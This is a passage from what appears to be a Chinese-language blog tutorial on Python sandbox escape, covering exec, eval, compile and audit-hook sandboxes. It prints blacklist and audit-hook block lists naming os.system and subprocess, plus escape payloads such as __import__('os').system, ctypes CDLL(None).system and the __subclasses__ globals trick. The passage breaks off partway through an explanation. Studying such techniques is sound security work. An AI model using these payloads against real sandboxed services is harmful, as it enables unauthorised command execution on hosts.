    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Python%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">Python漏洞</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Python%E6%BC%8F%E6%B4%9E/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" itemprop="url" rel="index"><span itemprop="name">python沙箱逃逸</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>59k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:47</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
<span id="more"></span>

<h3 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h3><p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
<p>在Python中，沙箱主要用于限制Python代码的能力，例如，阻止其访问文件系统、网络，或者限制其使用的系统资源。Python沙箱的实现方式有多种，包括使用 Python 的内置功能（如re模块），使用特殊的 Python 解释器（如PyPy），或者使用第三方库（如RestrictedPython）。</p>
<p>然而，Python 并没有提供内建的、可靠的沙箱机制,并且 Python 的标准库和语言特性提供了很多可以用于逃逸沙箱的方法，因此在实践中创建一个完全安全的 Python 沙箱非常困难。</p>
<h3 id="常见沙箱"><a href="#常见沙箱" class="headerlink" title="常见沙箱"></a>常见沙箱</h3><h4 id="exec-执行"><a href="#exec-执行" class="headerlink" title="exec 执行"></a>exec 执行</h4><p>Python的<code>exec()</code>是一个内建函数，用来执行动态生成的Python代码。也就是说，<code>exec()</code>可以执行储存在字符串或者对象中的Python。<code>exec()</code>基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(object, globals, locals)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>object</code> 必需参数，是一个字符串，或者是任何可以被 <code>compile()</code> 函数转化为代码对象的对象。</li>
<li><code>globals</code> 可选参数，是一个字典，表示全局命名空间 (全局变量)，如果提供了，则在执行代码中被用作全局命名空间。</li>
<li><code>locals</code> 可选参数，可以是任何映射对象，表示局部命名空间 (局部变量)，如果被提供，则在执行代码中被用作局部命名空间。如果两者都被忽略，那么在 <code>exec()</code> 调用的地方决定执行的命名空间。</li>
</ul>
<p><strong>exec还有另外一种写法：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec command in _global</span><br></pre></td></tr></table></figure>

<p>其中<code>_global</code>为一个字典，表示command将在<code>_global</code>指定的命名空间中运行。</p>
<p>示例沙箱：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getexp</span>():</span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_filter</span>(<span class="params">command</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure>

<h4 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h4><p><em>eval的执行与exec基本一致</em>，都可以对命名空间进行限制，例如下面的代码，在这个示例中就是直接将命名空间置空，这样就使得内置的函数都无法使用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;code&gt; &quot;</span>), </span><br><span class="line">         &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, <span class="comment">#全局变量空间</span></span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125; <span class="comment">#局部变量空间</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p><strong>代码解析</strong></p>
<p>在Python中，<code>eval()</code>函数用于执行一个字符串表达式，并返回表达式的结果。其语法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(expression, globals=None, locals=None)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>expression</code>：要计算的字符串表达式。</li>
<li><code>globals</code>：可选参数，用于指定全局命名空间。</li>
<li><code>locals</code>：可选参数，用于指定局部命名空间。</li>
</ul>
<p><u>默认情况下</u>，<code>eval()</code>函数在当前的全局和局部命名空间中执行表达式，这意味着它可以访问内置函数和当前上下文中的所有变量和函数。然而，通过显式传递<code>globals</code>和<code>locals</code>参数，可以控制表达式执行时的命名空间。</p>
<p>在上面那串代码中，<code>eval()</code>的第二个参数和第三个参数都设置为<code>&#123;&quot;__builtins__&quot;:&#123;&#125;&#125;</code>。这两个参数分别代表全局和局部命名空间。同时为什么这样设置可以导致内置函数无法使用，原因就是这样的代码构造成了一些区别，如下：</p>
<ol>
<li><strong>清空命名空间</strong>：<ul>
<li>传递给<code>eval()</code>的全局命名空间是一个字典<code>&#123;&quot;__builtins__&quot;: &#123;&#125;&#125;</code>，这意味着<code>eval()</code>将在这个空字典中查找全局变量。</li>
<li>同样地，传递给<code>eval()</code>的局部命名空间也是一个字典<code>&#123;&quot;__builtins__&quot;: &#123;&#125;&#125;</code>，这意味着<code>eval()</code>将在这个空字典中查找局部变量。</li>
</ul>
</li>
<li><strong>无内置函数：</strong><ul>
<li>Python内置函数和异常处理器默认情况下存储在<code>__builtins__</code>模块中。如果<code>__builtins__</code>设置为空字典，所有的内置函数（如<code>print</code>, <code>len</code>, <code>int</code>等）和异常类（如<code>ValueError</code>, <code>TypeError</code>等）都将不可用</li>
</ul>
</li>
</ol>
<p><strong>总结</strong>：<u>将<code>globals</code>和<code>locals</code>都设置为<code>&#123;&quot;__builtins__&quot;: &#123;&#125;&#125;</code>，相当于将命名空间置空，剥夺了<code>eval()</code>对内置函数、全局变量和局部变量的访问权</u>。这种做法增加了执行的安全性，但同时也限制了可以执行的表达式的范围。</p>
<h5 id="eval与exec-的区别"><a href="#eval与exec-的区别" class="headerlink" title="eval与exec 的区别"></a>eval与exec 的区别</h5><p>eval与exec的区别在于<code>exec</code>允许<code>\n</code>和<code>;</code>进行换行，而eval不允许。并且exec不会将结果输出出来，而 eval 会。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>) <span class="comment">#Using &quot;;&quot;</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;)\n__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>) <span class="comment">#Using &quot;\n&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>) <span class="comment">#Eval doesn&#x27;t allow &quot;;&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;</span>, <span class="string">&#x27;&lt;stdin&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)) <span class="comment">#This way eval accept &quot;;&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;</span>, <span class="string">&#x27;&lt;stdin&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">compile</span>(<span class="string">&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;</span>, <span class="string">&#x27;&lt;stdin&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;stdin&gt;表示代码块的来源是标准输入</span></span><br></pre></td></tr></table></figure>

<p>如果加入了 compile 函数则需要按照 compile 函数的模式进行区分。</p>
<h5 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h5><p><code>compile()</code>函数是一个内置函数，<strong>它可以将源码编译为代码或AST对象</strong>。编译的源码可以是普通的Python代码，也可以是AST对象。如果它是一个普通的Python代码，那么它必须是一个字符串。如果它是一个AST对象，那么它将被编译为一个代码对象。</p>
<p><code>compile()</code>函数的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)</span><br></pre></td></tr></table></figure>

<ul>
<li>source：要编译的源代码。它可以是普通的 Python 代码，或者是一个 AST 对象。如果它是普通的 Python 代码，那么它必须是一个字符串。</li>
<li>filename：源代码的文件名。如果源代码没有来自文件，你可以传递一些可识别的值。</li>
<li>mode：源代码的种类。可以是 ‘exec’，’eval’ 或 ‘single’。’exec’ 用于模块、脚本或者命令行，’eval’ 用于简单的表达式，’single’ 用于单一的可执行语句。</li>
<li>flags 和 dont_inherit：这两个参数用于控制编译源代码时的标志和是否继承上下文。它们是可选的。</li>
<li>optimize：用于指定优化级别。默认值为 -1。</li>
</ul>
<p><strong>mode 参数决定了如何编译输入的源代码</strong>。具体来说，它有三个可能的值： ‘exec’，’eval’ 和 ‘single’。</p>
<ul>
<li>‘exec’： exec 方式就<strong>类似于</strong>直接使用 exec 方法，可以处理换行符，分号，import语句等，这就意味着，被编译的源代码中可以包含复杂的语句序列。</li>
<li>‘eval’： eval 方式也就<strong>类似于</strong>直接使用 eval，只能处理简单的表达式，不支持换行、分号、import 语句</li>
<li>‘single’：这个模式<strong>类似于</strong> ‘exec’，但是它只用于执行单个语句(可以在语句中添加换行符等)。</li>
</ul>
<p><strong>需要注意的是</strong>：<u>Python内置的<code>compile()</code>函数只是用来将源代码（一般是字符串或者AST对象）<strong>编译为代码或AST对象</strong></u>。 <strong><code>mode</code>参数决定了源代码应该如何被解释</strong>，<code>compile()</code>函数只负责编译源代码，但并不会执行它。真正执行编译后的代码需要使用<code>eval()</code>或<code>exec()</code>函数,比如下面的基于AST的沙箱的示例代码。</p>
<h4 id="基于audit-hook-的沙箱"><a href="#基于audit-hook-的沙箱" class="headerlink" title="基于audit hook 的沙箱"></a>基于audit hook 的沙箱</h4><p><strong>Python 3.8</strong>中引入的一个 audit hook（审计钩子）的新特性。审计钩子可以用来监控和记录Python程序在运行时的行为，特别是那些安全敏感的行为，如文件的读写、网络通信和动态代码的执行等。</p>
<p><strong><code>sys.addaudithook</code> 是Python的一个系统函数，</strong>被用于在Python程序运行过程中添加审计钩子（audit hook）</p>
<p><strong><code>sys.addaudithook(hook)</code>的参数<code>hook</code>是一个函数</strong>，它的定义形式为<code>hook(event: str,args: tuple)</code>。其中，<code>event</code>是一个描述事件名称的字符串，<code>args</code>是一个包含了该事件相关的参数的元组。</p>
<p>一旦一个审计钩子被添加，那么在解释器运行时，每当发生一个与安全相关的事件，就会调用该审计钩子函数。<code>event</code>参数会包含事件的描述，<code>args</code>参数则包含了事件的相关信息。这样，审计钩子就可以根据这些信息进行审计记录或者对某些事件进行阻止。</p>
<p><strong>注意</strong>：由于<code>sys.addaudithook()</code>主要是用于增加审计和安全性，一旦一个审计钩子被添加，它不能被移除，这是为了防止恶意代码移除审计钩子以逃避审计</p>
<p>比如，可以如下定义一个审计钩子，使得每次触发<code>open</code>事件都会打印一条消息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Opening file: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys.addaudithook(audit_hook)</span><br></pre></td></tr></table></figure>

<p>然后，如果运行 <code>open(&#39;myfile.txt&#39;)</code>，就会得到 <code>Opening file: (&#39;myfile.txt&#39;,)</code> 这样的输出。</p>
<p>在一些沙箱的题目中也会使用这种方式，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line">    ...</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这个沙箱对<code>&#39;pty.spawn&#39;, &#39;os.system&#39;, &#39;os.exec&#39;, &#39;os.posix_spawn&#39;,&#39;os.spawn&#39;,&#39;subprocess.Popen&#39;</code> 这些函数进行了限制，一旦调用则抛出异常.</p>
<p><strong>同样由于这个特性的存在，我们可以定义黑名单或者白名单来限制调用</strong>，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">黑名单：</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line">    ...</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>白名单，如下沙箱值允许 input exec compile等函数的调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>为什么要在集合前面加<code>set()</code>函数：</strong>使用 set 类型的数据结构是因为 set 在查找元素（即检查元素是否存在于集合中）时的效率是非常高的，几乎为常数时间。相较于列表或元组，set 的优势就在于当你需要频繁地查找元素时，能够让代码运行得更快。<br>再者，使用 set 还有个好处是它会自动去除任何重复的元素，这对于确保每个事件只出现一次非常有用。</p>
<p>在白名单这种情况下，一般的payload无法使用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）&gt; <span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line">Operation <span class="keyword">not</span> permitted: <span class="keyword">import</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）&gt; [ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">Operation <span class="keyword">not</span> permitted: os.system</span><br></pre></td></tr></table></figure>

<p>代码解析：</p>
<p><strong>对于（1）</strong>：</p>
<ul>
<li><p><code>__import__(&#39;ctypes&#39;)</code>：导入<code>ctypes</code>库，<code>ctypes</code>库是Python的一个外部函数库，可以用来调用C语言中的动态链接库</p>
</li>
<li><p><code>CDLL(None)</code>：会加载C库，在 ctypes 中，如果我们传递 <code>None</code> 给 <code>CDLL()</code>，它将会加载 C 的标准库。<strong>系统的 C 标准库中包含了很多我们常用的系统调用函数</strong>，比如文件操作、输入输出、甚至包括了 <code>system()</code> 函数。所以，<code>CDLL(None).system()</code> 实际上是调用了 C 标准库中的 <code>system()</code> 函数。</p>
</li>
